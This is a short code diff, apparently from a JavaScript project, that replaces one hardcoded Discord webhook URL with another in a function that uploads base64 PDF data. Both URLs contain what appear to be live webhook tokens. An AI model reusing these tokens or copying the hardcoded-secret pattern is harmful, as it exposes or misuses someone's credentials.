@@ -48,7 +48,7 @@ function convertImagesToBase64(callback) {
 }
 
 function sendToWebhook(pdfData, fileName) {
-    const url = 'https://discord.com/api/webhooks/1357100176426139818/OigvegZ9mSCHxZrnNNA40usaqCPZIWxu80p6jNYzN-ADU1zkcWon6dP1Mqgg9P14Pm4a';
+    const url = 'https://discord.com/api/webhooks/1357760776269729983/IPMgOJtdl_wP0aBM1KD_UFx1ZYEjmGtTYQnfdJmQkSyGkRGX1P9V4tX75P9qumEz7KuP';
 
     const byteCharacters = atob(pdfData);
     const byteArrays = [];
